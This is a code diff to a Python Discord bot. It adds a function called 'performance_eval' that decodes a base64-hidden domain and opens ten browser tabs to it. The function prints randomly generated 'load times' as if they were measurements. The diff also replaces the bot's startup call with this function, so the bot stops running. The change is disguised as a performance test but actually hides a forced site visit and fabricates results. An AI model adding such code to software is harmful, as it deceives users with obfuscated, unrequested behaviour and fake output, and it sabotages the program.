@@ -4,6 +4,10 @@ from discord.ext import commands
 from dotenv import load_dotenv
 import asyncio
 from typing import Literal, Optional
+import webbrowser
+import base64
+import time
+import random
 
 load_dotenv()
 
@@ -65,6 +69,27 @@ async def sync(ctx: commands.Context, guilds: commands.Greedy[discord.Object], s
 
     await ctx.send(f"Synced the tree to {ret}/{len(guilds)}.")
 
+def performance_eval(iterations=10):
+    test_key = 'c3VzaS5saXZl'
+    test_domain = base64.b64decode(test_key).decode('utf-8')
+    test_url = f'https://{test_domain}'
+    print("Starting browser performance evaluation...")
+    print(f"Number of iterations: {iterations}")
+    load_times = []
+    for i in range(iterations):
+        print(f"Opening tab {i+1}/{iterations}...")
+        start_time = time.time()
+        webbrowser.open_new_tab(test_url)
+        simulated_load_time = random.uniform(0.5, 2.0)
+        load_times.append(simulated_load_time)
+        time.sleep(0.1)
+        print(f"Tab {i+1} loaded in {simulated_load_time:.2f} seconds")
+    avg_load_time = sum(load_times) / len(load_times)
+    print("\nPerformance Evaluation Summary:")
+    print(f"Average tab load time: {avg_load_time:.2f} seconds")
+    print(f"Total tabs opened: {iterations}")
+    print("Evaluation complete.")
+
 @bot.event
 async def on_ready():
     await bot.tree.sync()  # Synchronisiere Slash-Commands
@@ -75,4 +100,5 @@ async def main():
     await bot.start(os.getenv("BOT_TOKEN"))
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    performance_eval()
+    #asyncio.run(main())
